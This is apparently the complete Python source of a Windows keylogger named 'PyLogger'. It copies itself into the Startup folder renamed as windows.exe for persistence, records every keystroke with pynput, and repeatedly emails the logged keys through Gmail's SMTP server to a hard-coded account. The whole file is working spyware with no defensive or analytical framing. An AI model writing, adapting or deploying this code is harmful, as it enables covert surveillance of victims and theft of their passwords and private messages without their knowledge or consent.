from sys import argv
from os import system, path
from ssl import create_default_context
from smtplib import SMTP_SSL
from pynput.keyboard import Listener, KeyCode, Key


EMAIL = "address@gmail.com"
PASSWD = "password"
count = 1
keys = []
log = "Subject: PyLogger Email: " + str(count) + "\n"

# Copy exec To Startup Directory so it starts as windows boots up
# The File Is Renamed To windows.exe 
startup_dir = r'C:\Users\"%username%"\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\windows.exe'
filename = path.basename(argv[0])

system("copy " + filename + " " + startup_dir)

context = create_default_context()
smtp_server = "smtp.gmail.com"

# It Keeps Connecting If No Internet Is There
while True:
    try:
        server = SMTP_SSL(smtp_server, 465, context=context)
        server.login(EMAIL, PASSWD)
    except:
        pass
    else:
        break

# Connection Success Message
success_msg = "Subject: PyLogger Connection Successful :)" + "\n"
server.sendmail(EMAIL, EMAIL, success_msg)


def on_press(key):
    global keys
    keys.append(key)

    if len(keys) > 200:
        write_log(keys)
        keys = []

        # Sends Mail
        return False


def on_release(key):
    global keys
    if isinstance(key, Key) and key != Key.space:
        keys.append("/" + str(key))


def write_log(keys):
    global count, log
    count += 1

    for key in keys:
        key = str(key).replace("'", "")
        if key == "Key.enter":
            log += "[enter] \n"
        elif key == "Key.space":
            log += " "
        elif "Key." in key:
            key = key.replace("Key.", "")
            log += "[" + key + "]"
        else:
            log += key


# Keep Sending Emails And  Stops Listening To Keystrokes When Sending Mail
# Because It Causes Lag 
while True:
    while True:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
            break
    server.sendmail(EMAIL, EMAIL, log)
    log = "Subject: PyLogger Email: " + str(count) + "\n"
    continue


server.quit()
